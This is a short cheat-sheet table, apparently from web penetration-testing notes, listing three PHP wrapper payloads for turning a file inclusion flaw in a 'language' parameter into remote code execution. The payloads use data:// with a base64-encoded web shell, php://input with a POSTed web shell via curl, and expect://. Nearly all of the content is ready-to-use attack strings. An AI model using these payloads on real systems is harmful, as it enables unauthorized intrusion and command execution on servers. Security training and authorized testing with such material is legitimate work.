___

# PHP Wrappers

| `/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id`                    | RCE with data wrapper   |
| --------------------------------------------------------------------------------------------------------------------------- | ----------------------- |
| `curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"` | RCE with input wrapper  |
| `curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"`                                                        | RCE with expect wrapper |
